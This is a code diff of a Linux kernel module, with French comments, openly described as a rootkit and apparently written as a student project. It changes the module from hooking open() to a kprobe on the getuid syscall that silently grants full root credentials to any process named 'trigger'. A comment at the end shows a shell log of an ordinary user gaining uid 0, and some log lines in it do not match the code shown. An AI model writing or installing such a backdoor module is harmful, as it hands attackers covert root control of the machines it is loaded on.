@@ -3,112 +3,109 @@
 #include <linux/kernel.h>
 #include <linux/syscalls.h>
 #include <linux/kallsyms.h>
-#include <linux/version.h>
+#include <linux/cred.h>
+#include <linux/kprobes.h>
+#include <linux/sched.h>
 
-#include "ftrace_helper.h"
-
-// licence du module (GPL = General Public License) en gros opensource
-// le LKM sera marqué comme propriétaire si on ne mets pas ca et si le noyau impose des restrictions sur les modules propriétaires, ca peut poser des problemes
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("victor, marouane, mina, axel");
-// pour avoir la description quand on fait modinfo 
-MODULE_DESCRIPTION("Hide LKM");
+MODULE_AUTHOR("Victor");
+MODULE_DESCRIPTION("Hook getuid syscall to give root privileges using Kprobes");
 MODULE_VERSION("0.01");
 
-
-// check la version du kernel, pt_regs pour les syscall en 4.17 ou plus
-#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
-#define PTREGS_SYSCALL_STUBS 1
-#endif
-
-// si PTREGS_SYSCALL_STUBS est défini, on inclut les stubs pour les syscall
-#ifdef PTREGS_SYSCALL_STUBS
-// Pointeur vers la f° open pour save ses fonction d'origine
-static asmlinkage long (*orig_open)(const struct pt_regs *);
-struct ftrace_hook;
-asmlinkage int hook_open(const struct pt_regs *regs);
+static struct kprobe kp;
 void set_root(void);
 
-// f° hooké qui remplace le syscall open
-asmlinkage int hook_open(const struct pt_regs *regs)
+static int handler_pre(struct kprobe *p, struct pt_regs *regs)
 {
-    void set_root(void);
+    const char *target_cmd = "trigger";  // Nom de la commande a trigger pour activer la privesc
+    char comm[TASK_COMM_LEN]; // Nom du processus actuel
 
-    // Obtenir le nom du fichier que l'utilisateur essaie d'ouvrir
-    char __user *filename = (char *) regs->di;
+    // Récupérer le nom du processus actuel
+    get_task_comm(comm, current);
 
-    // Vérifier si le fichier demandé est /tmp/root_access
-    if (strcmp(filename, "/tmp/root_access") == 0)
-    {
-        printk(KERN_INFO "rootkit: Giving root privilege ...\n");
+    // Vérifier si la commande correspond à la cible
+    if (strcmp(comm, target_cmd) == 0) {
+        printk(KERN_INFO "rootkit: Granting root privileges for process %s...\n", comm);
         set_root();
-        return 0;
     }
 
-    // si c'est pas le bon fichier, on appelle la f° d'origine
-    return orig_open(regs);
+    return 0;
 }
 
-#else
-static asmlinkage long (*orig_open)(const char __user *filename, int flags, mode_t mode);
 
-static asmlinkage int hook_open(const char __user *filename, int flags, mode_t mode)
+
+static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
 {
-    void set_root(void);
-
-    if (strcmp(filename, "/tmp/root_access") == 0)
-    {
-        printk(KERN_INFO "rootkit: Giving root access via open...\n");
-        set_root();
-        return 0;
+    // Si le syscall a réussi, on met le registre ax à 0
+    if (regs->si == 0) {
+        regs->ax = 0;  // Indique succès pour le syscall
     }
-
-    return orig_open(filename, flags, mode);
 }
-#endif
+
 
 void set_root(void)
 {
     struct cred *root;
-    // on récupère les credentials actuels du processus (uid, gid, etc)
     root = prepare_creds();
-
     if (root == NULL)
         return;
-    
-    // on mets tout a 0, ducoup on est root :)
+
     root->uid.val = root->gid.val = 0;
     root->euid.val = root->egid.val = 0;
     root->suid.val = root->sgid.val = 0;
     root->fsuid.val = root->fsgid.val = 0;
 
-    // ca c'est pour appliquer "réellement" les changements
     commit_creds(root);
 }
 
-// tableau de struct ftrace_hook pour def l'appel qu'on veut hook
-static struct ftrace_hook hooks[] = {
-    // ici on appel la f° __x64_sys_open et on lui passe notre f° hook_open
-    // &orig_open est un pointeur vers la f° d'origine pour la réutiliser si le flag est pas 64
-    HOOK("__x64_sys_open", hook_open, &orig_open),
-};
-
 static int __init rootkit_init(void)
 {
-    int err;
-    // installe les hooks (la f° est dans ftrace_helper.h)
-    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
-    if(err)
-        return err;
+    int ret;
+    kp.symbol_name = "__x64_sys_getuid";
+    kp.pre_handler = handler_pre;
+    kp.post_handler = handler_post;
 
+    ret = register_kprobe(&kp);
+    if (ret < 0) {
+        printk(KERN_ERR "rootkit: Failed to register kprobe, returned %d\n", ret);
+        return ret;
+    }
+
+    printk(KERN_INFO "rootkit: Kprobe registered at %s\n", kp.symbol_name);
     return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
-    // enlève le hook
-    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    unregister_kprobe(&kp);
+    printk(KERN_INFO "rootkit: Kprobe unregistered\n");
 }
 
 module_init(rootkit_init);
 module_exit(rootkit_exit);
+
+
+/*
+
+(none):~# echo "#!/bin/bash" > /usr/bin/trigger
+(none):~# echo "id" >> /usr/bin/trigger
+(none):~# chmod +x /usr/bin/trigger
+(none):~# insmod getuid.ko 
+[ 1256.021602] rootkit: Kprobe registered at __x64_sys_getuid
+(none):~# su feur
+[ 1257.587381] rootkit: getuid called by process su
+[ 1257.588579] rootkit: getuid called by process su
+[ 1257.599878] rootkit: getuid called by process sh
+/root $ id
+[ 1259.110862] rootkit: getuid called by process id
+[ 1259.111222] rootkit: getuid called by process id
+uid=1000(feur) gid=1000(feur) groups=10(wheel),1000(feur)
+/root $ trigger
+[ 1261.506248] rootkit: getuid called by process trigger
+[ 1261.506368] rootkit: Granting root privileges for process trigger...
+[ 1261.525060] rootkit: getuid called by process id
+[ 1261.526145] rootkit: getuid called by process id
+uid=0(root) gid=0(root) groups=10(wheel),1000(feur)
+/root $ 
+
+ */
